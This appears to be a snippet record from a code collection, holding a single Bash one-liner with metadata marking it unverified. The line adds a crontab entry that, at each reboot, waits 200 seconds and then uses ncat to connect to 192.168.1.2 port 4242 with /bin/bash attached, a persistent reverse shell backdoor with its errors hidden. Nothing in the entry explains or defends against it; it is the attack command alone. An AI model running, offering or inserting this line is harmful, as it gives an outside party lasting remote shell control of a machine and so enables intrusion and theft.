---
id: b6f9c1de-b095-47b2-9171-ae226db515ab
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:56:17.952824+00:00'
updated_at: '2023-04-10T20:34:18.598510+00:00'
---

# Code Snippet b6f9c1de

**Language**: Bash

```bash
(crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null
```


